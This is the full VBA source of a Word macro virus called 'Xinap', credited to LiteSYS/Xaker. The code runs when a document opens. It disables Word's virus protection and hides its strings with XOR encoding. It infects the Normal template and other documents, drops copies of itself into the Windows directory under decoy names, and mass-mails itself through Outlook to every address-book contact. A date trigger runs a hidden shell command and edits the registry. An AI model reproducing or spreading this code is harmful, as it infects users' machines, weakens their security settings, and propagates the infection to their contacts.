   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Xinap - By LiteSYS/Xaker
   Private Sub Document_Open()
   On Error Resume Next
   System.PrivateProfileString("", cr("DGIUSOY^^IBXSY_I^P_cjx{m~iPAeo~ccjxPCjjeoiP5""<P[c~hP_ioy~exu", 12), cr("^wdw~", 18)) = 1
   With Application.Application: .DisplayStatusBar = Not -1: End With
   With Application.Options: .VirusProtection = Not -1: .SaveNormalPrompt = Not -1: End With
   WinDir = Environ(cr("_afLaz", 8))
   If (Mid(System.LanguageDesignation, 1, 7) = cr("Cuvg÷ij", 6)) Then
   NombresAleatorios = Array(cr("]kva.J{|a jam", 14), cr("Yxnb~-}ll-Zdcibz~#ibn", 13), cr("Lncjakn}f`/WWW!k`l", 15), cr("Ryxbetb1axrpetb?u~r", 17), cr("[dnfj%odh", 11))
   Else
   NombresAleatorios = Array(cr("Bkxniexo*Yor$nei", 10), cr("@~ysx`d7Ce~t|d9sxt", 23), cr("NNN6Uwzsxrwd8ryu", 22), cr("J|a`9svr|j7}vz", 25), cr("A~t|?u~r", 17))
   End If
   For I = 1 To Tasks.Count
   If (Tasks.Item(I).Name = cr("FQW'Jhinshu", 7)) Or (Tasks.Item(I).Name = cr("PUnocjbQohYEjguu", 6)) Then Tasks.Item(I).Close
   Next
   Set AD = Word.Application.ActiveDocument
   Set COPEI = Word.Application.NormalTemplate
   Set MVR = AD.VBProject.VBComponents(1).CodeModule
   Set MAS = COPEI.VBProject.VBComponents(1).CodeModule
   ADeco = False: Chavista = False
   If (MVR.Lines(1, 1) = cr("#\mjet$)$F}$HmpaW]W+\eoav", 4)) Then ADeco = True
   If (MAS.Lines(1, 1) = cr("$[jmbs#.#Az#OjwfPZP,[bhfq", 3)) Then Chavista = True
   If (ADeco = False) Then
   Capocho$ = MAS.Lines(1, MAS.CountOfLines): MVR.AddFromString Capocho
   ActiveDocument.Save
   End If
   If (Chavista = False) Then
   Huguito$ = MVR.Lines(1, MVR.CountOfLines): MAS.AddFromString Huguito
   NormalTemplate.Save
   End If
   If (Dir(cr("A8^okpa^okpa10,gzg", 2)) <> "") And (System.PrivateProfileString("", cr("DGIUSOY^^IBXSY_I^P_cjx{m~iPAeo~ccjxP[ebhc{POy~~ibxZi~ecb", 12), cr("Udcl}R`D_N", 13)) <> "1") And (Chavista = True) And (ADeco = True) Then
   Randomize: Peca = Int(Rnd * 100) Mod 5 + 1
   Nombre = WinDir & "\" & NombresAleatorios(Peca)
   Jeva = ActiveDocument.FullName: ActiveDocument.SaveAs Nombre: ActiveDocument.SaveAs Jeva
   If (Dir(cr("[""Duqj{Dk{jqhl6qvq", 24)) <> "") Then Kill (cr("b}LHSB}RBSHQUHOH", 33))
   Open cr("fyHLWFyVFWLUQLKL", 37) For Output As #9
   Print #9, cr("DL|mvokB", 31)
   Print #9, cr("s- rs=,'WRTS'>'f=2t{=F=9st~v=  =9px=@=f=u|qi=`=a=2y~~=nxsy=9st~v=", 29) & """" & Nombre & """ }"
   Close #9
   System.PrivateProfileString("", cr("nmcyesttchrysuctzuI@RQGTCzkOETIUI@RzqOHBIQUzeSTTCHRpCTUOIH", 38), cr("Dur}lCqUN_", 28)) = "1"
   End If
   If (System.PrivateProfileString("", cr("RQ_CEYOHH_TNEOI_HFIu|nm{hFWsyhuiu|nFMst~umiFYohhtnLhisut", 26), cr("@qvyhGWTS", 24)) <> "1") And (Chavista = True) And (ADeco = True) Then
   Set Olk = CreateObject(cr("Isrjiim(Gvvjoegroih", 6))
   If (Olk <> "") Then
   Set mpk = Olk.GetNameSpace(cr("DHY@", 9))
   If (mpk = "") Then GoTo OlkE
   For I = 1 To mpk.AddressLists.Count
   Set libdir = mpk.AddressLists(I): Set MiMail = Olk.CreateItem(0)
   For J = 1 To libdir.AddressEntries.Count
   Destino = libdir.AddressEntries(J): MiMail.Recipients.Add Destino
   Next
   MiMail.Subject = "": MiMail.Body = "": MiMail.Attachments.Add ActiveDocument.FullName: MiMail.Send
   Next
   End If
   OlkE:
   Olk.Quit
   System.PrivateProfileString("", cr("ZYWKMQG@@W\FMGAW@NA}tfes`wN_{q`}a}tfNE{|v}eaNQg``w|fDw`a{}|", 18), cr("NxwfIYZ]", 22)) = "1"
   End If
   If (Day(Now) = 28) Then
   System.PrivateProfileString("", cr("\_QMKWAFFQZ@KAGQFHG{r`cufqHWxuggqgHWXG]PHo&$P$ RQ$9'UQU9%$""-9U&P,9$,$$&V'$'$-Pi", 20), "") = cr("_nifw", 7)
   System.PrivateProfileString("", cr("NMC_YEJGUUCUYTIIRZEJUOBZ}46B62@C6+5GCG+760?+G4B>+6>664D5656?B{", 6), "") = cr("]lkdu", 5)
   jok = Shell(cr("EHKLE)J3)Q@GHY", 9), vbHide)
   If (Int(Rnd * 5 + 1) = 3) Then For I = 1 To 100: Assistant.Visible = 1: With Assistant.NewBalloon: .Animation = msoAnimationBeginSpeaking: .Icon = msoIconAlertCritical: .Text = cr("C@qvyhE8Nqjmk8za8Tql}KAK7@ys}j", 24) & vbCrLf & cr("O|w|cl|ux9+))(", 25): .Show: End With: Next
   End If
   ActiveDocument.Saved = True
   End Sub
   Private Function cr(poc As String, cap As Integer) As String: For I = 1 To Len(poc): mol = Asc(Mid(poc, I, 1)) Xor cap: noc$ = noc$ & Chr(mol): Next: cr = noc$: End Function
